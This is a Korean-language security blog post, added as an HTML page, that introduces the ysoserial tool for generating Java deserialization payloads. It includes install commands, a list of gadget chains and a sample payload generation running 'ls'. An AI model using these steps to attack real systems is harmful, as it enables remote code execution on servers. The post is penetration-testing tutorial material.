@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>YSoSerial - Java object deserialization payload generator | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="YSoSerial - Java object deserialization payload generator">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/ysoserial-java-object-deserialization/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="YSoSerial - Java object deserialization payload generator">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/ysoserial-java-object-deserialization/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"YSoSerial - Java object deserialization payload generator","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/ysoserial-java-object-deserialization/","datePublished":"2018-06-08T00:00:00+00:00","dateModified":"2021-07-10T00:00:00+00:00","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/blog-2018-ysoserial-java-object-deserialization.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/"},{"@type":"ListItem","position":5,"name":"YSoSerial - Java object deserialization payload generator"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">YSoSerial - Java object deserialization payload generator</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2018-06-08">
+                        JUNE 8, 2018
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>2017년 OWASP TOP10에 새로운 공격 벡터가 올라왔었는데요. 바로 Insecure deserialization 입니다. (<a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/10/web-hacking-owasp-top-10-2017-rc2-review.html">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2017/10/web-hacking-owasp-top-10-2017-rc2-review.html</a> )</p>
+<p>은근히 포인트가 많지만 실제 공격 성공으로 만들기엔 조건이 까다로운 경우가 많은데요. 오늘은 그 까다로운 경우 중 하나인 Payload 만들기, 그 중에서도 이를 쉽게 지원해주는 툴에 대한 이야기를 하려고 합니다.</p>
+<h3 id="ysoserialwhy-so-serious">YSoSerial(Why so serious)</h3>
+<p><a href="https://4.bp.blogspot.com/-cUNZgQROZoc/Wxq7dPfENzI/AAAAAAAADII/SfmFp7LwRAUL8ZSJzA7WkZLG64PN17YJwCLcBGAs/s1600/giphy.gif"><img loading="lazy" src="https://4.bp.blogspot.com/-cUNZgQROZoc/Wxq7dPfENzI/AAAAAAAADII/SfmFp7LwRAUL8ZSJzA7WkZLG64PN17YJwCLcBGAs/s640/giphy.gif" alt="" /></a></p>
+<h2 id="ysoserial">ysoserial</h2>
+<p>위에서 간략히 설명드린대로 Deserialization을 위한 도구이며 Jocker의 명대사인 Why so serious를 모티브로 이름을 지은 것으로 보입니다.
+(네이밍 센스보소..)</p>
+<p>Deserialization 시 JSON이나 여러 포맷으로 저장된 데이터를 Object, String, Interger 등 내부 코드로 환원하는데 이 과정에서 악의적인 Object, 즉 코드를 삽입한다는 것은 익히 아시고 계실겁니다.
+다만 실제로 테스팅시에는 그리 호락호락하진 않았습니다. deserialization 포인트가 있다고 해도 사용할 수 있는 Method의 제한을 받고있고, 이를 기반으로 Payload 를 생성하는 것도 굉장히 불편한 일이죠.
+(대부분 취약점 분석이 그렇겠지만.. BlackBox Testing 이면 더더욱...)</p>
+<p>ysoserial은 공격자가 원하는 명령 수행을 쉽게 하기 위해 gadget chains을 이용하여 payload를 생성해줍니다.
+코드를 볼 수 있는 경우에는 덜하겠지만 코드를 보지 못하는 환경에서 공격코드 구현은 Binary exploit이 됩니다. 이는 매우 노가다이고 힘들기에, 대상 어플리케이션에서 사용하는 라이브러리를 이용하여 Payload를 만들어 사용합니다.
+(이러면 직접 다 구현할 필요가 없어지죠)</p>
+<p>공용 라이브러리에서 추출한 가젯을 가지고 페이로드를 빌드하는 것을 가젯 체인으로 부르는 것 같습니다.</p>
+<h2 id="install">Install</h2>
+<p>나름 긴 설명이 있었으니 후딱 설치해서 테스팅해봅시다. ysoserial은 Java code로 구현되어서 jar로 압축하여 사용 가능합니다.
+아래 git에서 clone 받아 maven으로 빌드해주셔도 되고, JitPack에 올라온 build된 jar 파일을 바로 사용하셔도 좋습니다.</p>
+<p>Git</p>
+<pre><code>#&gt; git clone https://github.com/frohoff/ysoserial
+</code></pre>
+<p>JitPack</p>
+<pre><code>#&gt; wget https://jitpack.io/com/github/frohoff/ysoserial/master/ysoserial-master.jar
+</code></pre>
+<p>다운로드/빌드가 완료되면..</p>
+<pre><code>#&gt; java -jar ysoserial-master.jar
+</code></pre>
+<h2 id="payload-type">Payload type</h2>
+<p>오늘자 기준으로 대략 30개 정도의 payload 옵션이 존재합니다. 각각 Java~Framework 버전에 따라 사용하실 수 있습니다.</p>
+<pre><code>  Available payload types:
+     Payload             Authors                     Dependencies
+     -------             -------                     ------------
+     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
+     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
+     Clojure             @JackOfMostTrades           clojure:1.8.0
+     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsCollections1 @frohoff                    commons-collections:3.1
+     CommonsCollections2 @frohoff                    commons-collections4:4.0
+     CommonsCollections3 @frohoff                    commons-collections:3.1
+     CommonsCollections4 @frohoff                    commons-collections4:4.0
+     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
+     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
+     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
+     Groovy1             @frohoff                    groovy:2.3.9
+     Hibernate1          @mbechler
+     Hibernate2          @mbechler
+     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JRMPClient          @mbechler
+     JRMPListener        @mbechler
+     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
+     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     Jdk7u21             @frohoff
+     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
+     MozillaRhino1       @matthias_kaiser            js:1.7R2
+     Myfaces1            @mbechler
+     Myfaces2            @mbechler
+     ROME                @mbechler                   rome:1.0
+     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
+     URLDNS              @gebl
+     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
+</code></pre>
+<h2 id="generate-payload">Generate Payload!</h2>
+<p>1번쨰 인자값으로 Payload 옵션을 넘겨주고 두번째 인자값으로 실행할 명령을 넘겨주면 됩니다.</p>
+<pre><code>#&gt; java -jar ysoserial-master.jar Spring2 ls
+��srIorg.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider�J��A�IindexL
+methodNametLjava/lang/String;providert?Lorg/springframework/core/SerializableTypeWrapper$TypeProvider;xptnewTransformers}=org.springframework.core.SerializableTypeWrapper$TypeProviderxrjava.lang.reflect.Proxy�'� �C�Lht%Ljava/lang/reflect/InvocationHandler;xpsr2sun.reflect.annotation.AnnotationInvocationHandlerU���~�L
+[....]
+</code></pre>
+<p>기본적으로는 화면에 출력하게 되고, 이를 파일로 저장하고 Burp에서 값을 불러와 사용해도 됩니다.</p>
+<pre><code>#&gt; java -jar ysoserial.jar Spring2 ls &gt; d_payload.txt
+</code></pre>
+<pre><code>#&gt; ftc d_payload.txt
+[+] Success copy 4090 length data to clipboard
+</code></pre>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
